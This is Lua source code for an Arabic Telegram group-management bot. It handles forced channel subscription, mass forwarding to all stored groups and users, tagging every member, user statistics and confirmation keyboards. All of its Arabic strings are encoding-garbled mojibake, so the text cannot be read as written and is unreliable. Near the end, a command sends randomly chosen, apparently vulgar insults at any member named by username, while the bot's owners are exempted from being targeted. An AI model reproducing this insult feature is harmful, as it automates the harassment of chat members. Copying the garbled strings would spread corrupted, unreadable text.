send(msg.chat_id_, msg.id_,"β β« ΩΨ§ΨͺΩΨ¬Ψ― ΩΩΨ§Ψ© ΩΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ ΩΨΉΨ±Ω ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ω")
end
end
return false  
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω" then  
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Devmfm:del(mustafa..'Devmfm2') Devmfm:del(mustafa..'Devmfm3')
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "Ψ­Ψ°Ω ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω" or text == "Ψ­Ψ°Ω ΩΩΨ§Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω" then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Devmfm:del(mustafa..'Devmfm2') Devmfm:del(mustafa..'Devmfm3')
Dev_mfm(msg.chat_id_, msg.id_, 1,"β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'Ψ¬ΩΨ¨ ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω' or text == 'ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω' or text == 'Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω' or text == 'ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω' then
if Devmfm:get(mustafa..'Devmfm3') then
local DevCh = Devmfm:get(mustafa..'Devmfm3')
send(msg.chat_id_, msg.id_, "β β« ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω β ["..DevCh.."]")
else
send(msg.chat_id_, msg.id_, "β β« ΩΨ§ΨͺΩΨ¬Ψ― ΩΩΨ§Ψ© ΩΩΩΩ° Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω")
end
return false  
end end
--     Source Escobar     --
if SudoBot(msg) then
if text == 'Ψ§Ψ°Ψ§ΨΉΩ ΩΩΩΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ' and tonumber(msg.reply_to_message_id_) > 0 then
function mustafaTEAM(extra,result,success)
if Devmfm:get(mustafa.."mfm:Send:Bot"..mustafa) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨΉΩΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
local GpList = Devmfm:smembers(mustafa.."mfm:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = Devmfm:smembers(mustafa.."mfm:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§Ψ°Ψ§ΨΉΨ© Ψ±Ψ³Ψ§ΩΨͺΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ \nβ β« βΩΩΩΩ° β β¨ '..#GpList..' β© ΩΨ¬ΩΩΨΉΩ \nβ β« ΩΨ§ΩΩ β β¨ '..#PvList..' β© ΩοΏ½οΏ½ΨͺΨ±Ω \n β', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),mustafaTEAM)
end
end
--     Source Escobar     --
if text == "ΩΨ΄Ψ§ΩΨ―Ω Ψ§ΩΩΩΨ΄ΩΨ±" and ChCheck(msg) or text == "ΩΨ΄Ψ§ΩΨ―Ψ§Ψͺ Ψ§ΩΩΩΨ΄ΩΨ±" and ChCheck(msg) or text == "ΨΉΨ―Ψ― Ψ§ΩΩΨ΄Ψ§ΩΨ―Ψ§Ψͺ" and ChCheck(msg) then
Devmfm:set(mustafa..'mfm:viewget'..msg.sender_user_id_,true)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ­Ψ³ΩΨ§ ΩΩ Ψ¨Ψ§ΨΉΨ§Ψ―Ψ© ΨͺΩΨ¬ΩΩ ΩΩΩΩΨ΄ΩΨ± Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ―ΩΩ Ψ­Ψ³Ψ§Ψ¨ ΩΨ΄Ψ§ΩΨ―Ψ§ΨͺΩ', 1, 'md')
end
--     Source Escobar     --
if text == "Ψ§ΩΨ³ΩΨ±Ψ³" or text == "Ψ³ΩΨ±Ψ³" or text == "ΩΨ§ Ψ³ΩΨ±Ψ³" then
local text =  [[*
    ππ΄π»π²πΎπΌπ΄ ππΎ π΄ππ²πΎπ±π°π 
    β ------- π΄ππ²πΎπ±π°π ------- β*
    
β β« [π΄ππ²πΎπ±π°π ππΎπππ²π΄](https://t.me/TEAM_Escobar)

    *β ------- π΄ππ²πΎπ±π°π ------- β*

β β« [ΙͺΚΚα΄ΚΙͺα΄](https://t.me/F16_ibra)
β β« [α΄α»₯Ρα΄α΄?α΄](https://t.me/MFMVIP)

]]
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source Escobar     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "Ψ§Ψ·Ψ±Ψ―ΩΩ" and ChCheck(msg) or text == "Ψ§Ψ―ΩΨ±ΩΩ" and ChCheck(msg) then
if Devmfm:get(mustafa.."mfm:Kick:Me"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΨ°Ω Ψ§ΩΨ?Ψ§Ψ΅ΩΩ ΩΩΨΉΩΨ·ΩΩ ', 1, 'md')
return false
end
Devmfm:set(mustafa..'yes'..msg.sender_user_id_..'', 'delyes')
Devmfm:set(mustafa..'no'..msg.sender_user_id_..'', 'delno')
local Text = 'β β« ΩΩ Ψ§ΩΨͺ ΩΨͺΨ£ΩΨ― ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω'
keyboard = {} 
keyboard.inline_keyboard = {{{text="ΩΨΉΩ",callback_data="/delyes"},{text="ΩΨ§",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Escobar     --
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ' and Manager(msg) and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Kick:Me"..msg.chat_id_, true)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ' and Manager(msg) and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Kick:Me"..msg.chat_id_)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Escobar     --
if text == "ΩΨ²ΩΩΩ" and ChCheck(msg) then
if Devmfm:get(mustafa.."mfm:Del:Me"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ ΩΨ°Ω Ψ§ΩΨ?Ψ§Ψ΅ΩΩ ΩΩΨΉΩΨ·ΩΩ ', 1, 'md')
return false
end
Devmfm:set(mustafa..'yesdel'..msg.sender_user_id_..'', 'delyes')
Devmfm:set(mustafa..'nodel'..msg.sender_user_id_..'', 'delno')
local Text = 'β β« ΩΩ Ψ§ΩΨͺ ΩΨͺΨ£ΩΨ― ΩΩ ΨͺΩΨ²ΩΩΩ'
keyboard = {} 
keyboard.inline_keyboard = {{{text="ΩΨΉΩ",callback_data="/yesdel"},{text="ΩΨ§",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Escobar     --
if text == 'ΨͺΨΉΨ·ΩΩ ΩΨ²ΩΩΩ' and BasicConstructor(msg) and ChCheck(msg) then
Devmfm:set(mustafa.."mfm:Del:Me"..msg.chat_id_, true)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± ΩΨ²ΩΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'ΨͺΩΨΉΩΩ ΩΨ²ΩΩΩ' and BasicConstructor(msg) and ChCheck(msg) then
Devmfm:del(mustafa.."mfm:Del:Me"..msg.chat_id_)
local mustafaTEAM = 'β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β '..mfmRank(msg)..' \nβ β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± ΩΨ²ΩΩΩ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Escobar     --
if Admin(msg) then
if text == "ΨͺΨ§Ω ΩΩΩΩ" and ChCheck(msg) then
function TagAll(dp1,dp2)
local text = "β β« Ωκ«ΩΩ°ΩΪͺΩΩΩΩ ΩΩ°Ψ’ΩΩΰ’ͺΨ¨ΩΩΩΩΨ \nββββ EB ββββ\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if Devmfm:get(mustafa..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..Devmfm:get(mustafa..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
--     Source Escobar     --
if text and text:match("^ΩΩΩΩΩ (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(ΩΩΩΩΩ) (.*)$")}
function TagAll(dp1,dp2)
local text = "β β« "..txt[2].." \nββββ EB ββββ\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if Devmfm:get(mustafa..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..Devmfm:get(mustafa..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source Escobar     --
if text == "Ψ±Ψ³Ψ§Ψ¦ΩΩ" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨΉΨ―Ψ― Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ ΩΩΩΨ’ β *β¨ "..user_msgs.." β©*", 1, 'md')
end
if text == "Ψ§ΩΨͺΩΨ§ΨΉΩ" and ChCheck(msg) then
local EntryNumber = (Devmfm:get(mustafa..'mfm:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (Devmfm:get(mustafa..'mfm:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (Devmfm:get(mustafa..'mfm:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ§ΩΨΆΩΨ§Ω Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΩΩ β *"..EntryNumber.."*\nβ β« ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΩΩ β *"..ExitNumber.."*\nβ β« ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΩΩ β *"..MsgNumberDay.."*\nβ β« ΩΨ³Ψ¨Ψ© Ψ§ΩΨͺΩΨ§ΨΉΩ Ψ§ΩΩΩΩ β *"..math.random(40,100).."%*", 1, 'md')
end
--     Source Escobar     --
if text == "ΩΨΉΨ±ΩΩΩΩ°" and ChCheck(msg) then
function get_username(extra,result,success)
text = 'β β« ΩΩΨΉΩΩΰ’ͺΩΪͺ β β¨ User β©'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
if text == "Ψ§Ψ³ΩΩ" and ChCheck(msg) then
function get_firstname(extra,result,success)
text = 'β β« Ψ§Ψ³ΩΩ β firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_mfm(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source Escobar     --
if text == "ΩΨ¨Ψ±ΩΨ¬ Ψ§ΩΨ³ΩΨ±Ψ³" then  Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« [@F16_ibra]', 1, 'md') end
if text == "ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³" then  Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« @MFMVIP', 1, 'md') end
if text == "Ψ§ΩΩΨ³" or text == "ΩΩΨ³Ω" or text == "Ψ§Ψ±ΩΨ― Ψ¨ΩΨͺ Ψ§ΩΩΩΨ³Ω" or text == "Ψ―Ψ²ΩΩ Ψ¨ΩΨͺ Ψ§ΩΩΩΨ³Ω" or  text == "Ψ―Ψ²ΩΩΩ Ψ¨ΩΨͺ Ψ§ΩΩΩΨ³Ω" then  Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« @NNBBOT', 1, 'md') end
if text == "Ψ±Ψ§Ψ¨Ψ· Ψ­Ψ°Ω" or text == "Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΨ­Ψ°Ω" or text == "Ψ§Ψ±ΩΨ― Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΨ­Ψ°Ω" or  text == "Ψ΄ΩΨ±ΩΩ Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΨ­Ψ°Ω" or text == "Ψ§Ψ±ΩΨ― Ψ±Ψ§Ψ¨Ψ· Ψ­Ψ°Ω" then local inline = {{{text="Ψ§ΨΆΨΊΨ· ΩΩΩΨ’",url="https://my.telegram.org/auth"}}} SendInline(msg.chat_id_,'β β« Ψ§ΨΆΨΊΨ· ΩΩΨ­Ψ΅ΩΩ ΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·',nil,inline) return false end
if text == "Ψ¬ΩΨ§ΨͺΩ" and ChCheck(msg) or text == "Ψ§ΨΆΨ§ΩΨ§ΨͺΩ" and ChCheck(msg) then add = (tonumber(Devmfm:get(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨΉΨ―Ψ― Ψ¬ΩΨ§ΨͺΩ Ψ§ΩΩΨΆΨ§ΩΩ β *β¨ "..add.." β©* ", 1, 'md') end
if text == "ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ" or text == "Ψ³Ψ­ΩΨ§ΨͺΩ" and ChCheck(msg) then local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨΉΨ―Ψ― ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ β *β¨ "..edit_msg.." β©* ", 1, 'md') end
if text == "Ψ§ΩΨ―ΩΩ" and ChCheck(msg) then Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ’ΩΩ°ΪΩΪͺ β β¨ `'..msg.sender_user_id_..'` β©', 1, 'md') end
if text == "Ψ±ΨͺΨ¨ΨͺΩ" and ChCheck(msg) then Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ωΰ’ͺΨͺΨ¨ΨͺΪͺ β '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "Ψ§ΩΨ―Ω Ψ§ΩΩΨ­ΩΩΨΉΨ©" and ChCheck(msg) then Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β `"..msg.chat_id_.."`", 1, 'md') end
if text == 'ΩΨ³Ψ­ Ψ³Ψ­ΩΨ§ΨͺΩ' or text == 'ΩΨ³Ψ­ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' or text == 'Ψ­Ψ°Ω Ψ³Ψ­ΩΨ§ΨͺΩ' or text == 'Ψ­Ψ°Ω ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ' then Devmfm:del(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ ΨͺΨΉΨ―ΩΩΨ§ΨͺΩ Ψ¨ΩΨ¬Ψ§Ψ­' , 1, 'md') end
if text == 'ΩΨ³Ψ­ Ψ¬ΩΨ§ΨͺΩ' or text == 'ΩΨ³Ψ­ Ψ§ΨΆΨ§ΩΨ§ΨͺΩ' or text == 'Ψ­Ψ°Ω Ψ¬ΩΨ§ΨͺΩ' or text == 'Ψ­Ψ°Ω Ψ§ΨΆΨ§ΩΨ§ΨͺΩ' then Devmfm:del(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ¬ΩΨ§ΨͺΩ Ψ§ΩΩΨΆΨ§ΩΩ' , 1, 'md') end
--     Source Escobar     --
if text == 'Ψ§ΩΩΨ·ΩΨ±' or text == 'ΩΨ·ΩΨ±' then
local DevCh1 = Devmfm:get(mustafa.."Devmfm3")
local DevText = Devmfm:get(mustafa.."DevText")
if DevCh1 then DevCh = '\nβ β« *ππ* β¬ ['..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if dp.first_name_ ~= false then DevName = dp.first_name_ else DevName = dp.first_name_ end
if DevText then
Dev_mfm(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *ππππ* β¬ ['..DevName..']\nβ β« *ππππ* β¬ ['..DevUser..']\nβ β« *ππ* β¬ '..DevId..''..DevCh, 1, "md")
end
end,nil)
end
--     Source Escobar     --
if text and text:match('^ΩΩΩΩ @(.*)') and ChCheck(msg) or text and text:match('^ΩΩΩΩΨ§ @(.*)') then 
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^ΩΩΩΩ @(.*)') or text:match('^ΩΩΩΩΨ§ @(.*)') 
function mustafaTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ΄Ω ΨͺΩΨΆΨ±Ψ· Ψ§ΩΩ ΩΨ§Ψ­Ψ― ΩΩΩΩ ΩΩΨ³ΩΨπ€ππΏ', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ―Ω ΩΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΩΩΩ ΨͺΨ§Ψ¬ Ψ±Ψ§Ψ³ΩΩΨπππΏ', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(911945965) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ―Ω ΩΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΩΩΩ ΨͺΨ§Ψ¬ Ψ±Ψ§Ψ³ΩΩΨπππΏ', 1, 'md') 
return false  
end  
if Devmfm:sismember(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,result.id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ―Ω ΩΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΩΩΩ ΨͺΨ§Ψ¬ Ψ±Ψ§Ψ³ΩΩΨπππΏ', 1, 'md')
return false
end 
local mustafaTEAM = "Ψ΅Ψ§Ψ±Ψ± Ψ³ΨͺΨ§Ψ°ΩΩ ππ»ββοΈβ₯οΈ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
local mustafaTEAM = { "ΩΩΩ Ψ¬Ψ±Ψ¬Ω @"..username.." Ψ§Ψ­ΨͺΨ±Ω Ψ§Ψ³ΩΨ§Ψ―ΩΩ ΩΨ§ Ψ§ΩΨͺΩΩΩ ΩΨ§Ψ²Ψ±Ψ¨Ψ¨ ΨΉΩΩ ΩΨ¨Ψ±ΩΩΨπ©ππΏ","ΩΨ΄Ψ΄ ΩΩΩ ΩΨ§Ψ΄Ω @"..username.." ΩΨͺΨΆΩ ΨͺΩΨ³ΩΨͺ ΩΨ§ Ψ§Ψ?Ψ±Ψ¨Ψ· ΨͺΨΆΨ§Ψ±ΩΨ³ ΩΨ¬ΩΩ Ψ¬ΩΩ Ψ§Ψ¨Ψ· ΨΉΨ¨Ψ―ΩΨ πππΏ","Ψ­Ψ¨ΩΨ¨Ω @"..username.." Ψ±Ψ§Ψ­ Ψ§Ψ­Ψ§ΩΩ Ψ§Ψ­ΨͺΨ±ΩΩΩ ΩΨ§ΩΩΨ±Ω Ψ¨ΩΩΩ ΨͺΨ¨Ψ·Ω Ψ­ΩΩΩΩΨ π€πͺ","Ψ―ΩΨ΄Ω ΩΩ @"..username.." ΩΩΨ¨ΩΨΉ Ψ§ΩΩΨ΄Ω ΩΩ Ψ²ΩΩ ΩΩΩΩΩΩ°Ω ΩΩΨ­Ψ¬Ω ΩΩΨ§Ω ΩΩ ΩΩΨ¨ΩΨ° πππΏ","ΩΨ§ Ψ§ΩΨΊΩΩΨΆ Ψ§ΩΨͺΩΨ³ Ψ§Ψ¨Ω Ψ±Ψ§Ψ³ Ψ§ΩΩΨ±Ψ¨ΨΉ @"..username.." ΩΨͺΨΉΩΩΩΩ Ψ¬Ω Ψ­Ψ¬Ψ§ΩΩ ΩΨ¬Ψ§Ω ΨͺΨ·ΩΨ·ΩΩΩ ΨΉΩΩΩΩ Ψ―Ψ¨Ψ·Ωππͺ",}
Dev_mfm(msg.chat_id_, result.id_, 1,''..mustafaTEAM[math.random(#mustafaTEAM)]..'', 1, 'html') 
else  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ ΨΊΩΨ± ΩΩΨ¬ΩΨ― ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md') 
end 
end 
resolve_username(username,mustafaTEAM)
end
end
--     Source Escobar     --
if text == ("ΩΩΩΩ") or text == ("Ψ¨ΨΉΨ― ΩΩΩΩ") or text == ("ΩΩΩΩ Ψ¨ΨΉΨ―") or text == ("ΩΩ ΩΩΩΩ") or text == ("ΩΩΩΩΨ§") or text == ("ΩΩΩΩΩ") or text == ("Ψ±Ψ²ΩΩ") or text == ("Ψ±Ψ²ΩΩΩ") or text == ("Ψ±Ψ²ΩΩΨ§") then
if not Devmfm:get(mustafa..'mfm:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(mustafa) then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ΄Ω ΨͺΩΨΆΨ±Ψ· Ψ§ΩΩ ΩΨ§Ψ­Ψ― ΩΩΩΩ ΩΩΨ³ΩΨπ€ππΏ', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ―Ω ΩΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΩΩΩ ΨͺΨ§Ψ¬ Ψ±Ψ§Ψ³ΩΩΨπππΏ', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(911945965) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ―Ω ΩΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΩΩΩ ΨͺΨ§Ψ¬ Ψ±Ψ§Ψ³ΩΩΨπππΏ', 1, 'md')
return false
end 
if Devmfm:sismember(mustafa.."mfm:mfmConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'Ψ―Ω ΩΩΩ ΨͺΨ±ΩΨ― Ψ§ΩΩΩΩ ΨͺΨ§Ψ¬ Ψ±Ψ§Ψ³ΩΩΨπππΏ', 1, 'md')
return false
end 
local mustafaTEAM = "Ψ΅Ψ§Ψ±Ψ± Ψ³ΨͺΨ§Ψ°ΩΩ ππ»ββοΈβ₯οΈ" 
Dev_mfm(msg.chat_id_, msg.id_, 1,mustafaTEAM, 1, 'md') 
